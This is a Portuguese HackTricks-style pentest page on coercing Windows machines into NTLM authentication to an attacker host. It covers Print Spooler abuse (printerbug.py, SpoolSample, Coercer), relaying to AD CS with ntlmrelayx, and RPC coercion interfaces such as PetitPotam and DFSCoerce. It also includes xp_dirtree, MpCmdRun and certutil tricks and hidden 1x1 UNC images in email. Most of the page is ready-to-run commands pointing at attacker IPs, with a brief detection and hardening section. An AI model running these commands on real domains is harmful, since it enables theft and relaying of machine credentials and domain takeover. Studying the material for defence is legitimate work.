# Forçar autenticação privilegiada NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) é uma **coleção** de **remote authentication triggers** codificados em C# usando o compilador MIDL para evitar dependências de terceiros.

## Abuso do Spooler Service

Se o serviço _**Print Spooler**_ estiver **habilitado,** você poderá usar algumas credenciais de AD já conhecidas para **solicitar** ao print server do Domain Controller uma **atualização** sobre novos trabalhos de impressão e simplesmente dizer para ele **enviar a notificação para algum sistema**.\
Observe que, quando a impressora envia a notificação para sistemas arbitrários, ela precisa **se autenticar nesse** **sistema**. Portanto, um atacante pode fazer com que o serviço _**Print Spooler**_ se autentique em um sistema arbitrário, e o serviço **usará a conta do computador** nessa autenticação.

Por baixo dos panos, o primitivo clássico **PrinterBug** abusa de **`RpcRemoteFindFirstPrinterChangeNotificationEx`** sobre **`\\PIPE\\spoolss`**. Primeiro, o atacante abre um handle de impressora/servidor e, em seguida, fornece um nome de cliente falso em `pszLocalMachine`, fazendo com que o spooler do alvo crie um canal de notificação **de volta para o host controlado pelo atacante**. É por isso que o efeito é **coerção de autenticação de saída**, e não execução direta de código.<sup>[[2]](#references)</sup>\
Se você estiver procurando por **RCE/LPE** no próprio spooler, consulte [PrintNightmare](printnightmare.md). Esta página é focada em **coerção e relay**.

### Encontrando Windows Servers no domínio

Use o PowerShell para listar hosts Windows. Os servidores geralmente são os alvos de maior prioridade, então concentre-se neles primeiro:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Encontrando serviços Spooler em escuta

Usando o [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) de @mysmartlogin (Vincent Le Toux), ligeiramente modificado, verifique se o Spooler Service está em escuta:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Você também pode usar `rpcdump.py` no Linux e procurar pelo protocolo **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Ou teste rapidamente os hosts a partir do Linux com **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Se você quiser **enumerar as superfícies de coerção** em vez de apenas verificar se o endpoint do spooler existe, use o **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Isso é útil porque ver o endpoint no EPM apenas informa que a interface RPC de impressão está registrada. Isso **não** garante que todos os métodos de coerção sejam acessíveis com seus privilégios atuais ou que o host emita um fluxo de autenticação utilizável.

### Solicitar que o serviço se autentique em um host arbitrário

Você pode compilar [SpoolSample a partir daqui](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ou use [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se estiver no Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Com o **Coercer**, você pode direcionar diretamente as interfaces do spooler e evitar adivinhar qual método RPC está exposto:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Callbacks modernos de RPC-over-TCP

Não assuma que uma chamada `RpcRemoteFindFirstPrinterChangeNotificationEx` bem-sucedida necessariamente produzirá tráfego em TCP/445. **Windows 11 22H2 e versões posteriores usam RPC over TCP por padrão para comunicações de impressão**; RPC over named pipes fica desabilitado, a menos que uma policy ou `RpcUseNamedPipeProtocol=1` o restaure. Portanto, listeners legados que aceitam apenas SMB podem informar que o trigger foi enviado sem nunca receber o callback. A Microsoft documenta TCP/135 (Endpoint Mapper), além de portas RPC dinâmicas, para o RPC de impressão normal; as organizações podem restringir esse range ou selecionar uma porta RPC fixa para impressão.<sup>[[10]](#references)</sup>

O **Impacket `ntlmrelayx.py`** atual inclui um RPC relay server e um pequeno Endpoint Mapper, habilitado por padrão em TCP/135. Esse suporte foi incorporado em junho de 2025 especificamente com uma cadeia PrinterBug-to-AD-CS demonstrada, permitindo que o callback RPC autenticado fosse relayed mesmo quando a vítima não faz fallback para SMB/WebDAV.<sup>[[11]](#references)</sup>
```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
Procure por `Setting up RPC Server on port 135` e `RPCD: Received connection` na saída do relay. Se a chamada RPC retornar um erro esperado, mas nada chegar ao listener, verifique a política de transporte RPC de impressão da vítima, o filtering de saída, a resolução DNS e se outro processo já está usando a porta TCP/135. Verifique também se o `ntlmrelayx` não foi iniciado com `--no-rpc-server`.

### Forçando HTTP em vez de SMB com WebClient

Em sistemas que ainda usam **RPC over named pipes** (builds legados ou comportamento restaurado por política), o PrinterBug clássico geralmente resulta em uma autenticação **SMB** para `\\attacker\share`, que ainda é útil para **capture**, **relay para alvos HTTP** ou **relay quando a assinatura SMB está ausente**.\
No entanto, fazer relay de **SMB para SMB** é frequentemente bloqueado pela **assinatura SMB**, portanto os operadores podem preferir forçar a autenticação **HTTP/WebDAV**. Isso não é um fallback para o comportamento RPC-over-TCP descrito acima.

Se o serviço **WebClient** estiver em execução no alvo, o listener pode ser especificado em um formato que faça o Windows usar **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Isso é especialmente útil ao encadear com **`ntlmrelayx --adcs`** ou outros alvos de HTTP relay, pois evita depender da possibilidade de SMB relay na conexão coagida. A ressalva importante é que o **WebClient deve estar em execução** na vítima para que a variante HTTP/WebDAV funcione.

### Combinação com Unconstrained Delegation

Se um atacante comprometeu um computador configurado para [Unconstrained Delegation](unconstrained-delegation.md), ele pode **coagir a impressora a se autenticar nesse computador**. O **TGT** da conta de computador da impressora é então armazenado em cache na memória do host com unconstrained delegation, onde o atacante pode recuperá-lo e reutilizá-lo com [Pass the Ticket](pass-the-ticket.md).

### Notas sobre detecção e hardening

A maneira mais confiável de remover o PrinterBug de um DC, PAW ou servidor que não imprime é parar e desabilitar o Spooler. Quando a impressão for necessária, aplique hardening em todos os possíveis destinos de relay (assinatura de servidor SMB, assinatura de LDAP/vinculação de canal e EPA em serviços HTTP, como o AD CS), em vez de presumir que bloquear TCP/445 no caminho de callback seja suficiente.<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
A detecção deve correlacionar uma chamada autenticada ao UUID `12345678-1234-abcd-ef00-0123456789ab` do MS-RPRN, especialmente os opnum 62/65 com um valor de callback não local, e uma conexão SMB, HTTP ou RPC de saída imediata a partir do host do spooler. Estabeleça uma baseline de **interface UUID/opnum e pares de origem/destino**, não apenas do acesso a `\PIPE\spoolss`, pois as pilhas de impressão atuais podem posicionar o callback em RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Matriz de coerção de caminhos UNC via RPC (interfaces/opnums que acionam autenticação de saída)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: interface de impressão assíncrona no mesmo pipe do spooler; use o Coercer para enumerar métodos acessíveis em um determinado host<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (também via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums comumente abusados: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Nota: esses métodos aceitam parâmetros que podem transportar um caminho UNC (por exemplo, `\\attacker\share`). Ao serem processados, o Windows se autenticará (no contexto da máquina/usuário) nesse UNC, permitindo a captura ou o relay de NetNTLM.\
Para abuso do spooler, o **MS-RPRN opnum 65** continua sendo a primitiva mais comum e mais bem documentada, pois a especificação do protocolo declara explicitamente que o servidor cria um canal de notificação de volta para o cliente especificado por `pszLocalMachine`.<sup>[[2]](#references)</sup>

### Coerção do MS-EVEN: ElfrOpenBELW (opnum 9)
- Interface: MS-EVEN via \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Assinatura da chamada: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Efeito: o alvo tenta abrir o caminho de backup de log fornecido e se autentica no UNC controlado pelo atacante.<sup>[[1]](#references)</sup>
- Uso prático: coagir ativos Tier 0 (DC/RODC/Citrix/etc.) a emitir NetNTLM e, em seguida, fazer relay para endpoints do AD CS (cenários ESC8/ESC11) ou outros serviços privilegiados.<sup>[[1]](#references)</sup>

## PrivExchange

O ataque `PrivExchange` resulta de uma falha encontrada no recurso **`PushSubscription` do Exchange Server**. Esse recurso permite que qualquer usuário do domínio com uma mailbox force o servidor Exchange a se autenticar em qualquer host fornecido pelo cliente via HTTP.

Por padrão, o **serviço do Exchange é executado como SYSTEM** e recebe privilégios excessivos (especificamente, possui **privilégios WriteDacl no domínio antes da Cumulative Update de 2019**). Essa falha pode ser explorada para habilitar o **relay de informações para LDAP e, posteriormente, extrair o banco de dados NTDS do domínio**. Quando o relay para LDAP não é possível, essa falha ainda pode ser usada para fazer relay e autenticar em outros hosts dentro do domínio. A exploração bem-sucedida desse ataque concede acesso imediato ao Domain Admin com qualquer conta de usuário autenticada do domínio.

## Dentro do Windows

Se você já estiver dentro da máquina Windows, poderá forçar o Windows a se conectar a um servidor usando contas privilegiadas com:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ou use esta outra technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

É possível usar o lolbin certutil.exe (binário assinado pela Microsoft) para forçar a autenticação NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Se você souber o **endereço de email** do usuário que inicia sessão em uma máquina que deseja comprometer, basta enviar a ele um **email com uma imagem de 1x1** como
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Quando a vítima o abre, o Windows tenta autenticar.

### MitM

Se você puder realizar um ataque MitM e injetar HTML em uma página visualizada pela vítima, tente injetar uma imagem como:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Outras formas de forçar e fazer phishing de autenticação NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Se você conseguir capturar [desafios NTLMv1, leia aqui como fazer o cracking](../ntlm/index.html#ntlmv1-attack).\
_Lembre-se de que, para fazer o cracking de NTLMv1, você precisa definir o desafio do Responder como "1122334455667788"_

## References

- [1] [Unit 42 – A coerção de autenticação continua evoluindo](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Protocolo de remoting do EventLog](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Atualizações de conexão RPC para impressão no Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – Servidor de relay RPC e Endpoint Mapper para ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
{{#include ../../banners/hacktricks-training.md}}
